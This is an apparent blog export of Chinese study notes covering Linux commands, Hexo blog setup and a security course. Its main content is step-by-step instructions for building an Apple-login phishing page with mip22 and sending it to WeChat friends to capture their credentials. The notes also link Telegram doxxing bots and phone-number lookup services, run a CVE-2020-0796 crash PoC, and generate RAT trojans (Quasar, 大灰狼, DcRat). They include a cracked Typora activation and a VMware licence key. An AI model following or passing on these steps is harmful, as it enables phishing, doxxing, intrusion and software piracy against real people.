class="line">rm-rf 强制递归删除</span><br></pre></td></tr></table></figure><p>查看效果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701432299051-e7dbacdc-e0b1-4e76-a050-7af6b6707cbc.png" alt="image.png"><br>下图是rm -f 删除文件的对比<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701432848067-93264260-7fce-47b9-8576-b77b8ec91f3e.png" alt="image.png"><br>下图是rm -rf 删除文件的对比<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701432965781-12a0dfe0-31ea-4046-9a34-1893fc6a16fb.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /bin|grep 关键字 - 用于筛选关键字的文件</span><br><span class="line">ls /bin |more 竖着看</span><br><span class="line">cat /bin/ls 查看文本文档  二进制文件乱码</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701433319200-1ab918de-594c-4913-8d14-832dc726162b.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701433516776-acdb3012-1af7-40ab-a23c-2620ed1a632f.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701433637508-7dd0fa28-8cdb-408c-9b27-f2e742c30dc3.png" alt="image.png"><br>输入如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文本编辑：</span><br><span class="line">touch 123</span><br><span class="line">vi 123 i插入，esc，：wq！保存并退出</span><br><span class="line">：q！退出不保存</span><br><span class="line">touch 文件名 文件名 覆盖时间,同时创建文件</span><br><span class="line">cat -n 123 查看内容和行号</span><br><span class="line">cat 123 查看内容</span><br></pre></td></tr></table></figure><p>新建123，然后vi 123出现的结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701433775368-0ae4953e-4a10-49b0-a4c4-4cf481cc27c9.png" alt="image.png"><br>touch同时创建文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701434002453-a92d2214-c510-4117-aa1c-1922be4cc800.png" alt="image.png"><br>cat命令的使用：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701434092681-bb8521fa-7646-429d-9475-80eeaf62f953.png" alt="image.png"><br>输入下列命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 最大范围 搜索名字为ls的文件</span><br><span class="line">find / -name ls</span><br><span class="line">systemctl enable sshd</span><br><span class="line">systemct1 restart sshd</span><br><span class="line">ip add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701434354150-4e5188db-efd3-4ef8-a563-e984b17d87e0.png" alt="image.png"><br>输入vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config对38行进行修改，是yes就不用管，删除前面的#，如图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701434832364-1de7950e-2254-48d4-a73f-14e135290ecb.png" alt="image.png"><br>最后在物理机上win+r输入cmd，再次输入ssh root@虚拟机ip地址：ssh root@+ip，首次需要输入个yes<br>需要接着输入contos7的密码，成功后就是下图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701434948402-9c147d20-9ffd-40ad-b80e-c0eb659ba528.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux基本命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux基本命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c盘清理,博客搭建,上传笔记</title>
      <link href="/2023/12/01/C%E7%9B%98%E6%B8%85%E7%90%86,%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86,%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2,%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/12/01/C%E7%9B%98%E6%B8%85%E7%90%86,%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86,%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2,%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>一：<br>上午：<br>下载<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1701351533406-9b6feb44-d36d-4f5d-af52-7b196add8f46.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1701351533406-9b6feb44-d36d-4f5d-af52-7b196add8f46.zip%22,%22name%22:%22Dism%20%2010.1.1002.1.zip%22,%22size%22:3776223,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u236810c1-b479-43bb-a56e-803941f18d0%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u5948df8f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">Dism++10.1.1002.1.zip</a>，这个文件主要是对C盘进行清理<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701351752842-491eb95e-9408-45b7-9e7b-a818c12c3411.png" alt="image.png"><br>SpaceSniffer.exe查看当前磁盘所占空间，也可以任意删除当前空间。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701351882014-a3c7f16c-e22f-4f15-be90-1f33634eaedc.png" alt="image.png"><br>edge浏览器使用代理proxy<br>安装插件proxy：打开edge浏览器，点击三个点，点开拓展，获取Windows扩展，搜索Proxy，找到Proxy SwitchyOmega 2.5.20，下载之后安装完成，就可以设置代理，启动代理就可以去外网了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701352149681-a15add08-7158-404a-9546-89fa20375220.png" alt="image.png"><br>创建一个属于自己的博客网站：<br>下载git和node.js<br>git官网连接地址：<a href="https://git-scm.com/download">https://git-scm.com/download</a><br>node.js官网地址：<a href="https://nodejs.org/en/download">https://nodejs.org/en/download</a><br>分别下载并且安装最新的版本<br>在挂代理的前提下注册自己的guitub账号，保证自己的账号能够正常使用。<br>在G盘新建一个文件夹命名为hexo，在路径处输入cmd进入命令行模式，<br>创建一个blog文件夹：<br>npm install -g hexo-cli<br>hexo init blog<br>切换到blog文件夹：cd blog<br>hexo g<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701352964601-e6eaa1a1-5654-4d3c-96d4-5d363f785480.png" alt="image.png"><br>依次输入这几串代码：新建一个test_my_site<br>hexo new test_my_site<br>hexo g<br>hexo s<br>之后就可以访问<a href="http://localhost:4000/">http://localhost:4000/</a>访问本地的博客<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701353503544-cf0e1ede-e498-40ad-b99d-9aa0e6d880f9.png" alt="image.png"><br>输入整个命令ssh-keygen -t rsa -C “邮件地址”<br>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，当前所在的目录在C:\Users\林尘曦.ssh，打开id_rsa.pub的文件<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701353648596-7ab7b4b2-5aa9-4661-9728-8e974bbdf334.png" alt="image.png">记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701353551944-e6641513-a132-4d6f-88f3-bf7059bb9463.png" alt="image.png"><br>key填写C:\Users\林尘曦.ssh中的内容，尝试ssh连接,测试是否成功<br>在命令行输入ssh -T <a href="mailto:git@github.com">git@github.com</a> ，如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：<br>如果是第一次需要输入yes，出现如下结果就能成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701354004504-9a369999-950b-4bfc-bfa1-f89855fa0d18.png" alt="image.png"><br>在选中的位置(blog目录下)打开cmd(以管理员身份)<br>npm install hexo-deployer-git –save,在上一个Git Bash Here还需要继续配置<br>git config –global user.name “tfktk”&#x2F;&#x2F; 你的github用户名，非昵称<br>git config –global user.email “<a href="mailto:&#x33;&#x33;&#53;&#55;&#54;&#54;&#51;&#55;&#55;&#x37;&#51;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x33;&#x33;&#53;&#55;&#54;&#54;&#51;&#55;&#55;&#x37;&#51;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a>“&#x2F;&#x2F; 填写你的github注册邮箱<br>准备上传代码:在github上新建一个存储库，命名为github的用户名.github.io：例如创建一个tfktk.gitub.io的存储库。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701392879554-c1ede851-c27a-40a7-94d9-eb555b2282e6.png" alt="image.png"><br>编辑_config.yml文件，在最后一段改成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:tfktk/tfktk.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701354554558-aceb975b-580f-4c82-84bc-875bc7b2bef2.png" alt="image.png"><br>成功之后你就可以开始你的blog玩耍了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701354697975-b796235d-6a24-471e-98e4-4874adc598b2.png" alt="image.png"><br>在浏览器输入<a href="https://tfktk.github.io/">https://tfktk.github.io/</a>成功之后进入界面：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701354852479-33cbdf9b-3c82-4849-ad34-6ec3f49effed.png" alt="image.png"><br>下午：<br>下载并安装<a href="https://molunerfinn.com/PicGo/">PicGo</a>：<a href="https://molunerfinn.com/PicGo/">https://molunerfinn.com/PicGo/</a><br>下载并安装typora：<a href="http://192.168.2.6:5244/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/typora%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6.zip">http://192.168.2.6:5244/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/typora%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6.zip</a><br>找到刚刚安装的typora.exe，右键打开文件所在位置，找到app.asar文件将压缩包的文件进行替换<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355386523-6740ba99-6f95-4513-a79d-055c35bf0996.png" alt="image.png"><br>双击打开typora.exe，打开压缩包的激活码.txt，输入对应的位置进行激活，激活成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355542741-29f6e17b-a673-417f-aea0-a2bfc46702ce.png" alt="image.png"><br>点击文件，点击偏好设置，找到图像按如图设置：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355603572-fb73076e-ca04-41b4-b608-a12314f2d98b.png" alt="image.png"><br>重新建立一个专门存放图片的库，例如：picture库<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701393070407-5f656221-22c5-422d-8a1e-506740718174.png" alt="image.png"><br>缩小页面。打开PicGo，点击图床设置，点击gitub进行配置<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355842075-09fa44a7-6e8a-4fde-ba87-93dd1556e706.png" alt="image.png"><br>优先设置密钥：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355806462-ea4b7564-a0da-43cb-bd14-7cc313b95b67.png" alt="image.png"><br>点击验证图片选项，成功即出现如图所示界面：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701355904436-135684c7-6f89-4696-aa62-de1214df268f.png" alt="image.png"><br>整个图片上传的原理：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701356087975-c805ab70-ae36-4928-a411-53cd19dabbe1.png" alt="67882cd8254765792f246390a883f2c.png"><br>学习并练习了博客笔记用vscode来写：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701356172848-25f66bfc-cc75-422a-97fc-02fec44c2229.png" alt="image.png"><br>上传笔记：<br>找到自己的在线语雀笔记，进行导出选择方式为，此时生成的是第三天.md<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701435253276-3df09301-f6b6-447f-bcc7-ea32daf6221b.png" alt="image.png"><br>打开文件第三天.md将其复制到G:\hexo\blog\source_posts这个文件夹<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701435468745-db43d244-94a9-4f10-84e7-12d05993b216.png" alt="image.png"></p><p>在这个页面右键找到open Git Bash here<br>输入 hexo new 名字就会生成一个.md的文件<br>将第三天的内容复制到新生成的.md中，将新生成的第三天.md用Typora打开。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701436244258-0f6fd68b-e9cc-43c1-bd43-a94afbe08a13.png" alt="image.png"><br>特别注意图片需要单独传送，点击图片，右键通过picGo.app上传图片，原理在上面已经说过就不介绍了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701436495604-30b8c7e3-5695-4f42-98e6-5ad9af642068.png" alt="image.png"><br>默默等待图片上传完成就可在自己的个人博客主页<a href="https://tfktk.github.io/">https://tfktk.github.io/</a>查看到了</p>]]></content>
      
      
      <categories>
          
          <category> C盘清理,浏览器设置代理,搭建博客,上传笔记整体流程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C盘清理,浏览器设置代理,搭建博客,上传笔记流程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创造tg账号,制作并完善钓鱼网站,远程工具的使用</title>
      <link href="/2023/12/01/tg%E7%A4%BE%E5%B7%A5%E5%AD%A6,%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99,%E6%B8%97%E9%80%8F%E4%BB%8B%E7%BB%8D,%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/12/01/tg%E7%A4%BE%E5%B7%A5%E5%AD%A6,%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99,%E6%B8%97%E9%80%8F%E4%BB%8B%E7%BB%8D,%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>一：<br>上午:<br>安装vnc进行学习，展示了通过手机号查找个人基本信息，但是需要通过telegram，火狐，SMS接码平台，火狐代理管理<br>下面是相关telegram的一些电报频道:<br>您的专属邀请链接：<a href="https://t.me/AJL01_bot?start=C9uZSsbKX1">https://t.me/AJL01_bot?start&#x3D;C9uZSsbKX1</a><br>社工庫机器人：t.me&#x2F;aishegongkubot?start&#x3D;AISGK_HBEIR85X<br><a href="https://t.me/DATA_007bot?start=8989324940">https://t.me/DATA_007bot?start&#x3D;8989324940</a><br><a href="https://t.me/pingansgk_bot?start=ee95c5680f">https://t.me/pingansgk_bot?start&#x3D;ee95c5680f</a><br><a href="https://t.me/JokerSGKbot?start=87OE61VQ">https://t.me/JokerSGKbot?start=87OE61VQ</a><br> <a href="https://t.me/PyramidNetBot?start=pRg3K08">https://t.me/PyramidNetBot?start=pRg3K08</a><br><a href="https://t.me/XingDun2Bot?start=4eoHoLE">https://t.me/XingDun2Bot?start=4eoHoLE</a><br>浏览器访问，tg电报转化中文的地址：tg:&#x2F;&#x2F;setlanguage?lang&#x3D;classic-zh-cn<br>sms接码平台：<a href="https://sms-activate.org/cn/freePrice#activation">https://sms-activate.org/cn/freePrice#activation</a><br>代理购买：<a href="https://console.xenolink.net/#/register?code=vocvktBL">https://console.xenolink.net/#/register?code=vocvktBL</a><br>社工库：<a href="https://sgk66.cc/">https://sgk66.cc/</a></p><p>下午：<br>Windows10的永恒之黑漏洞实验：<br>1.安装python，版本越新越好。<br>   python官网：<a href="https://www.python.org/">https://www.python.org/</a><br>2.需要安装vmare虚拟机，然后安装Windows10虚拟机，利用本机使Windows10虚拟机蓝屏<br>   vm虚拟机官网地址：<a href="https://www.vmware.com/products/workstation-pro.html">https://www.vmware.com/products/workstation-pro.html</a><br>   直接下载最新的地址：<a href="https://download3.vmware.com/software/WKST-1750-WIN/VMware-workstation-full-17.5.0-22583795.exe">https://download3.vmware.com/software/WKST-1750-WIN/VMware-    workstation-full-17.5.0-22583795.exe</a><br>   VMare 虚拟机激活码：JU090-6039P-08409-8J0QH-2YR7F<br>3.物理机上面按win+r，输入cmd，ipconfig查看物理机地址下载CVE-2020-0796-Poc（它用python写的代码），的压缩包并解压，找到目录输入cmd，输入以下命令：<br>       python .\CVE-2020-0796.py+ Windows10虚拟机地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701254224547-02c52f4e-5c34-4002-9352-faca12ec1646.png" alt="image.png"><br>在整个过程中缺少哪个named就安装哪个，输入命令如下：pip3 install   xxxxx -i <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> –trusted-host mirrors.aliyun.com<br>4.当windows10虚拟机蓝屏重启时实验成功。</p><p>晚上：<br>作业1：注册tg号<br>方法：手机和电脑同时挂上代理，电脑登录sms接码平台，注册并充值自己的账号，购买号码并查看号码，然后手机开启代理，在手机上面可以通过谷歌商店下载一个电报，然后手机打开电报输入sms接码平台获得的号码，发送验证码，等待几分钟，当sms平台接收到验证码时，手机输入验证码，注册个人信息，进入电报即成功。然后将上述的邀请挨个导入自己的电报中，如果没有接收到验证码，继续刷新号码进行尝试。<br>作业2：完成永恒之黑实验<br>选修作业:自己学习渗透视频的基本介绍以及工具<br>1-1：渗透介绍：模拟恶意攻击者，挫败目标系统的安全措施。主要是web渗透：针对web应用程序，主要是这四个方面：服务器，中间件，数据库，web app<br>渗透工程师需要掌握的技能：开发思维和恶意攻击者的思路与方法<br>web渗透步骤：<br>1.信息收集:耗时多<br>2.整站映射:<br>3.漏洞扫描:<br>4.漏洞利用-可能需要拓展渗透结果进行进一步提权<br>5.测试报告-报告给出漏洞信息，验证信息，解决方法<br>注意：要及时和客户沟通，需要进行授权<br>结构图：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701174369976-5d8939a7-a77c-406a-9836-1454d79bd246.png" alt="1-1.png"><br>1-2：基本渗透工具介绍：<br>HTTP代理：介于浏览器和服务器之间的桥梁，常用工具Burpsuite<br>网络爬虫：对web app整个网站进行测试，常用工具：ZAP ,Httrack,Burpsuite<br>python工具：Scrapy<br>web漏洞扫描：web app技术进行探测，常用工具：AppScan,AWVS，python工具：W3af(更新慢)<br>目录检测：对web app不链接页面检测，常用工具：Dirb,Wfuzz<br>特定任务：自动化工具，学习python<br>基本框架如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701174502856-7516ed0e-18e4-4fa6-82db-34a22dee15da.png" alt="1-2.png"><br>1-3：HTTP状态码获取：<br>HTTP模型：客户端请求，服务端响应；响应状态码，标识接收或拒绝请求<br>python解决问题：测试网站：<a href="https://httpbin.org/">https://httpbin.org/</a><br>                            GET方式：获取200状态码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701175547236-b4bdf5fc-191c-4584-8dcf-3d50b3c0aad5.png" alt="1-3.png"><br>打开<a href="https://httpbin.org/">https://httpbin.org/</a>,使用get的方法获得200特征码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701265480072-1e1eb3a9-10b6-4bef-a71e-c171af4f76c7.png" alt="image.png"><br>在pycharm进行编写代码并且进行编译:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701266177625-d6e3d6de-7d63-49ad-b3d4-db89edd03640.png" alt="image.png"><br>在<a href="https://httpbin.org/">https://httpbin.org/</a>网站获得当前状态码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701266351421-8160ccfd-b4b0-4189-a7f9-370d9306b97b.png" alt="image.png"></p><p>二：<br>上午：<br>制造钓鱼网站:<br>1.打开虚拟机，安装kali linux，进入root模式(在整个过程中不能用快捷键进行粘贴复制)<br>输入：vim &#x2F;etc&#x2F;proxychains4.conf<br>2.在最后一行输入信号强的外网通道（IP地址 端口号）：socks5 192.168,2,36 10388,由于自己的代理无法完成下载，所以选择老师的。输入完按esc，输入：wq！(保存退出)。<br>3.输入命令,下载mip22:proxychains4 git clone <a href="https://github.com/makdosx/mip22">https://github.com/makdosx/mip22</a>(注意本次操作只用一次,成功之后将会显示错误命令)<br>4.输入ls,验证是否有mip22<br>5.切换到mip22目录:cd mip22<br>6.给当前目录赋予权限:chmod +x .&#x2F;*<br>7.进入mip22钓鱼网站制作页面:proxychains4 -q bash .&#x2F;mip22.sh<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701222759431-90fe1c2b-9293-4c68-ab82-c7920368afae.png" alt="image.png"><br>8.依次输入1,19,3,每次输入之后需要等待,最后出现URL http（s）和URL subdomain<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701223704393-814629ae-8b45-4e7d-a472-319f0dcc3894.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701223750918-475bae6f-2d95-476b-8b05-c3906fac024b.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701219855339-69c24a9b-3ba7-4c33-a5cb-744590f7de75.png" alt="image.png"><br>9.将https网址发送给微信好友，点击后能够获得输入者输入苹果注册的用户名和密码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701225864300-fcc45861-7b1a-4625-9f45-8e35f6a8aad3.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701225969540-1fec11f6-428d-4fee-9516-0220d0de3949.png" alt="image.png"><br>可看到当前用户输入的账号和密码。<br>介绍各个熟知系统的起源以及系统的演变过程，如图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701219914448-dc3c8eca-a5fb-4875-9d9a-aaec4e075282.png" alt="e2bd6aa635fb06c34d6dd8b61c1f28c.png"><br>下午：<br>介绍了昨天所看1-3视频关于获得特征码的另外两种方法：<br>1.在桌面上创建一个txt文件，重命名为1.py,输入如下代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line">r =requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure><p>在物理机上面win+r进入dos命令行状态，切换到Desktop目录下，输入python 1.py,回车，出现错误需要逐个安装模块，输入命令为：<br>pip install xxx   -i <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> –trusted-host mirrors.aliyun.com<br>当不报错时显示结果200的状态码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701254959342-843cfe2b-6cbf-4ac2-9e26-3dd75df2f01b.png" alt="image.png"><br>2.利用vscode完成本次实验：<br>   安装vscode注意不要安装在c盘，官网地址：<br>   也可下载老师的绿色vscode，安装之后打开需要下载四个扩展：python，pylance，vscode中文语音包，输入ai后出现的插件GitHub Copilot，，优先安装中文包，之后需要重启再次下载另外四个拓展。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701227027502-5250ea9f-2130-4c7a-a4cf-dd0f5847cd8e.png" alt="image.png"><br>在桌面建立文件夹命名为py,打开vscode,然后点击打开文件夹py,在py文件夹下面新建1.py,输入如下代码：<br>   在运行后发现缺少模块，在命令行中用下面这个命令补全一个个模块：pip install xxx   -i <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> –trusted-host mirrors.aliyun.com<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701237474749-532d7e9a-0276-406a-99a4-0afb9bf7e789.png" alt="image.png"><br>成功之后获得200的特征码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701237541774-7ee37bef-b14f-4240-81f4-75008bf01b8f.png" alt="image.png"><br>控制工具的使用介绍：<br>大灰狼的使用：在物理机输入win+r,查看当前物理机的IP地址。下载压缩包，解压到桌面，点开大灰狼远程控制桌面，点击输入当前的物理机IP地址生成一个木马软件命名为222.exe放入G盘。<br>打开Vm虚拟机,点击winhei10,打开Windows10受害机，将木马软件复制到Windows10虚拟机中，注意在本次实验中，虚拟机和物理主机均关闭防火墙以及安全防护特别是实时保护，双击222.exe,物理机大灰狼控制平台上面就可看到虚拟机已经能够控制，查看虚拟机基本信息，远程控制，语音输入，远程聊天，获取shell权限等等操作。切记在本次实验中将虚拟机Windows10的网络配置为NET模式,如果为桥接模式就会在物理主机上面无法获得Windows10的远程控制权限，因为在桥接模式下能够ping通其他地址，也能够连网，但是纯纯就是不能获得远程控制的权限，将222.exe复制到物理主机时，双击exe也能够进行远程控制，开始以为是Windows系统的差距，后面才经过排错就知道是网络配置的问题。<br>所获得的远程控制权限具体功能如图：<br>例如：远程桌面查看：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701255804325-f0baccb7-ab3c-477d-bf9d-9bf77d9205ff.png" alt="image.png"><br>唤起远程终端：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701255995746-314edd15-029b-4274-846a-1e6efad56994.png" alt="image.png"><br>三:<br>上午:<br>远程工具Quasar v1.4.0的使用方法：<br>点击设置,端口号设置为4782,再次点击生成，点击连接设置,连接主机处输入当前物理机的IP地址以及先前设置的端口号,点击生成客户端。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701256482824-de6fc57b-a1bb-42a8-8486-37bf8df54904.png" alt="image.png"><br>会生成一个Client-built.exe的文件，记住其生成的当前地址目录,复制文件将其粘贴到虚拟机Windows10上,切记本次开启虚拟机需要关闭实时保护才可进行粘贴,双击打开。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701222175984-48a11217-104c-45ef-95d9-3457e49ec849.png" alt="image.png"><br>开始监听，成功并获得远程控制等权限。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1701256356811-3087fa81-7af1-47dd-946c-d9bb528d4f33.png#averageHue=%23c19752&clientId=u06d8ada9-b546-4&from=paste&height=139&id=X503t&originHeight=174&originWidth=1270&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23045&status=done&style=none&taskId=u87b97c62-a8a2-4b07-8f5e-a25e2dea235&title=&width=1016" alt="image.png"><br>还是用了另外三款远程工具，其中Quasar.v1.4.0简单的windows10病毒制造软件工具的使用于Quasar v1.4.0的使用方法一样，都是创建一个Client-built.exe的文件去控制win10hei虚拟机<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701495527391-c05b37c0-485c-4ca6-8545-75a4d3508766.png" alt="image.png"><br>我还使用了一款叫做DcRat的远程工具，打开页面为这样的，由于不能制造文件所以本次无法实现，但是可以看到基本页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1701497441545-9ec3c0a7-562f-4285-b238-a0145f4e3e85.png#averageHue=%23f6f6f5&clientId=u2fa23ffc-7c80-4&from=paste&height=163&id=u091f45d7&originHeight=183&originWidth=460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15246&status=done&style=none&taskId=u54d9f99d-e1e8-4003-aa63-6d457e8232e&title=&width=408.8888888888889" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701495970430-04950e59-4b3b-43c1-bacc-c348e5937b06.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701496328140-dce125f6-46f2-4a5c-9378-166b54b8b0ab.png" alt="image.png"><br>由于和上面情况一样所以无法去生成关于Dcratch1.07远程软件的client.exe文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701497765889-fa6edde5-1478-49f3-8d2b-2438e16ee926.png" alt="image.png"></p><p>三：<br>今天所学习的是去进一步完善自己的钓鱼网站,让其表现得更加真实。<br>首先按照老师发的截图找到phpstudy_x64_8.1.1.2.exe,将其下载复制到Win10hei虚拟机中,中途会自动更新并将其安装到虚拟机中,双击打开phpstudy,点击网站,点击管理找到打开根目录这个选项，并清空当前文件,在桌面新建一个txt文件将其命名为index.txt,双击打开这个txt,输入以下代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span> hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span 